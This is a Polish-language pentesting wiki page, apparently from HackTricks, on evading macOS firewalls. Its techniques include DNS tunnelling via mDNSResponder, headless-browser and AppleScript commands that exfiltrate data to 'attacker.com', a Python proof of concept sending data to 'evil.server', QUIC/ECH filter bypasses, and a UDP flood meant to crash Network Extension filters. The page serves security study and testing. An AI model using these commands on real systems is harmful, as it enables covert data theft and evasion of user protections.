# Omijanie firewalli w macOS

{{#include ../../banners/hacktricks-training.md}}

## Znalezione techniki

Poniższe techniki okazały się skuteczne w przypadku niektórych aplikacji firewall dla macOS.

### Abusing whitelist names

- Na przykład uruchomienie malware pod nazwami dobrze znanych procesów macOS, takich jak **`launchd`**

### Synthetic Click

- Jeśli firewall poprosi użytkownika o zgodę, malware powinno **kliknąć allow**

### **Używanie binariów podpisanych przez Apple**

- Takich jak **`curl`**, ale także innych, np. **`whois`**

### Dobrze znane domeny Apple

Firewall może zezwalać na połączenia z dobrze znanymi domenami Apple, takimi jak **`apple.com`** lub **`icloud.com`**. iCloud może zostać użyty jako C2.

### Generic Bypass

Kilka pomysłów na próbę ominięcia firewalli

### Sprawdzanie dozwolonego ruchu

Znajomość dozwolonego ruchu pomoże zidentyfikować potencjalnie umieszczone na whitelistach domeny lub aplikacje, którym zezwolono na dostęp do tych domen
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abuse DNS

Na macOS proces **nie** komunikuje się bezpośrednio z serwerem DNS. Rozwiązywanie nazw odbywa się za pośrednictwem **XPC** przez **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), systemowego daemona podpisanego przez Apple, więc każde wyszukiwanie na komputerze opuszcza hosta jako ruch **pochodzący z `mDNSResponder`**, a nie z procesu, który go zainicjował. Firewalls mają zatem tendencję do bezwarunkowego zaufania temu daemonowi — jego zablokowanie przerwałoby rozwiązywanie nazw w całym systemie.<sup>[1]</sup>

To sprawia, że DNS pozostaje otwartym kanałem nawet wtedy, gdy firewall blokuje własne sockety malware:<sup>[1]</sup>

1. Malware próbuje połączyć się z `evil.com`. Jego **własne** połączenie wychodzące jest sprawdzane przez firewall i **blokowane**.
2. Malware zamiast tego prosi `mDNSResponder` o **rozwiązanie** `evil.com` za pośrednictwem XPC.
3. Firewall sprawdza wynikające z tego zapytanie, widzi jako nadawcę zaufany resolver podpisany przez Apple i **zezwala na nie**.
4. Zapytanie dociera do serwera DNS — a jeśli attacker kontroluje authoritative server dla `evil.com`, kontroluje oba końce wymiany.

Ponieważ attacker posiada tę strefę, nie jest potrzebne żadne „połączenie”: dane są przemycane w **odpytywanych etykietach** (np. `<encoded-chunk>.evil.com`), a polecenia wracają w **rekordach odpowiedzi** (TXT, A, CNAME…), co stanowi klasyczne DNS tunnelling wykorzystujące w pełni whitelisted proces.

Każdy nieuprzywilejowany proces może bezpośrednio sterować daemonem, co jest łatwym sposobem potwierdzenia, że ścieżka jest otwarta:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Za pomocą aplikacji przeglądarkowych

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

Jeśli możesz **wstrzyknąć code do procesu**, który ma zezwolenie na łączenie się z dowolnym serwerem, możesz ominąć zabezpieczenia firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
W lipcu 2024 roku firma Apple załatała critical bug w Safari/WebKit, który powodował awarię systemowego „Web content filter” używanego przez parental controls funkcji Screen Time.
Specjalnie spreparowany URI (na przykład z podwójnie zakodowanym przez URL „://”) nie jest rozpoznawany przez ACL funkcji Screen Time, ale jest akceptowany przez WebKit, więc request jest wysyłany bez filtrowania. W rezultacie każdy proces, który może otworzyć URL (w tym sandboxed lub unsigned code), może uzyskać dostęp do domen jawnie zablokowanych przez użytkownika lub profil MDM.<sup>[2]</sup>

Praktyczny test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Błąd porządkowania reguł Packet Filter (PF) we wczesnym macOS 14 „Sonoma”
Podczas cyklu beta macOS 14 firma Apple wprowadziła regresję w userspace wrapperze wokół **`pfctl`**.
Reguły dodane za pomocą słowa kluczowego `quick` (używanego przez wiele VPN kill-switches) były po cichu ignorowane, powodując traffic leaks, nawet gdy GUI VPN/firewalla zgłaszało *blocked*. Błąd został potwierdzony przez kilku dostawców VPN i naprawiony w RC 2 (build 23A344).

Szybki leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Nadużywanie helper services podpisanych przez Apple (legacy – przed macOS 11.2)
Przed macOS 11.2 **`ContentFilterExclusionList`** zezwalała około 50 binariom Apple, takim jak **`nsurlsessiond`** i App Store, na omijanie wszystkich socket-filter firewalls zaimplementowanych za pomocą frameworka Network Extension (LuLu, Little Snitch itd.).
Malware mógł po prostu uruchomić wykluczony proces — albo wstrzyknąć do niego code — i tunelować własny ruch przez już dozwolony socket. Apple całkowicie usunęło listę wykluczeń w macOS 11.2, ale technika ta nadal ma znaczenie w systemach, których nie można zaktualizować.<sup>[3]</sup>

Przykładowy proof-of-concept (przed 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH w celu obejścia filtrów domen Network Extension (macOS 12+)
NEFilter Packet/Data Providers opierają się na SNI/ALPN z TLS ClientHello. W przypadku **HTTP/3 over QUIC (UDP/443)** oraz **Encrypted Client Hello (ECH)** SNI pozostaje zaszyfrowane, NetExt nie może przeanalizować flow, a reguły hostname często działają w trybie fail-open, umożliwiając malware dostęp do zablokowanych domen bez korzystania z DNS.<sup>[5]</sup>

Minimalny PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Jeśli QUIC/ECH jest nadal włączone, stanowi to łatwy sposób na ominięcie filtrowania hostname.

### Niestabilność Network Extension w macOS 15 „Sequoia” (2024–2025)
Wczesne buildy 15.0/15.1 powodują awarie filtrów **Network Extension** firm trzecich (LuLu, Little Snitch, Defender, SentinelOne itd.). Po ponownym uruchomieniu filtra macOS usuwa reguły przepływów, a wiele produktów przechodzi w tryb fail-open. Zalewanie filtra tysiącami krótkich przepływów UDP (lub wymuszenie QUIC/ECH) może wielokrotnie wywoływać awarie i pozostawić okno dla C2/exfil, podczas gdy GUI nadal informuje, że firewall działa.<sup>[4]</sup>

Szybka reprodukcja (bezpieczna maszyna laboratoryjna):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Wskazówki dotyczące narzędzi dla nowoczesnego macOS

1. Sprawdź bieżące reguły PF generowane przez firewalle z interfejsem graficznym:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Wylicz pliki binarne, które już posiadają entitlement *outgoing-network* (przydatne do piggy-backingu):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programowo zarejestruj własny filtr treści Network Extension w Objective-C/Swift.
Minimalny rootless PoC przekazujący pakiety do lokalnego socketu jest dostępny w kodzie źródłowym **LuLu** autorstwa Patricka Wardle’a.

## Materiały referencyjne

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: tworzenie i łamanie firewalli macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Obejście filtra treści internetowych Apple umożliwia nieograniczony dostęp do zablokowanych treści (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple usuwa funkcję macOS, która umożliwiała aplikacjom omijanie zabezpieczeń firewalla - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Produkty cyberbezpieczeństwa przestają działać po aktualizacji macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Używanie ochrony sieci w celu zapobiegania połączeniom macOS ze szkodliwymi witrynami - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
